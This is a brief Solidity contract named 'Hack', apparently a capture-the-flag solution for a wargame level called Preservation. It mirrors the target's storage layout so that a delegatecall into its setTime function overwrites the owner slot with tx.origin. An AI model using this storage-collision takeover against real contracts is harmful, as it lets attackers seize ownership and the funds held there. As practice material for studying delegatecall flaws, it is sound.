// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPre {
	function setFirstTime(uint256 _timeStamp) external;
}

contract Hack {
	address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
	IPre preservation;

	constructor() {
		preservation = IPre(0xbb3186021bE937745Ea7bC7746dda305C7461577);
	}

	function setTime(uint256 _time) public {
        storedTime = _time;
		owner = tx.origin;
    }
}